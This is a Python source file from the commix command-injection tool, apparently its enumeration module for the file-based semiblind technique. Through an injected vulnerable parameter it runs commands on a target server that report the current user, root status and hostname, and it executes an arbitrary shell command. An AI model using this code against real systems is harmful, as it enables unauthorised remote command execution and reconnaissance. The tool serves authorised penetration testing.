#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import colors
from src.utils import settings


from src.core.injections.semiblind_based.techniques.file_based import fb_injector

"""
 The "File-based" technique on Semiblind-based OS Command Injection.
"""

def do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,delay):

  # Current user enumeration
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)			  
    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
    if shell:
      if menu.options.verbose:
	print ""
      shell = "".join(str(p) for p in shell)
      print "  (+) Current User : "+ colors.YELLOW + colors.BOLD + shell + colors.RESET + ""

  # Is-root enumeration
  if menu.options.is_root:
    cmd = settings.ISROOT
    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)			  
    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
    if shell:
      sys.stdout.write( "  (+) Current user is root :")
      sys.stdout.flush()
      shell = "".join(str(p) for p in shell)
      if shell != "0":
	print colors.RED + " FALSE "+colors.RESET
      else:
	print colors.GREEN + " TRUE "+colors.RESET 

  # Hostname enumeration
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)			  
    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
    if shell:
      if menu.options.verbose:
	print ""
      shell = "".join(str(p) for p in shell)
      print "  (+) Hostname : "+ colors.YELLOW + colors.BOLD +  shell + colors.RESET + ""
      
  # Single os-shell execution
  if menu.options.os_shell:
    cmd =  menu.options.os_shell
    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)		  
    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
    if shell:
      if menu.options.verbose:
	print ""
      shell = "".join(str(p) for p in shell)
      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET
      sys.exit(0)
    
# eof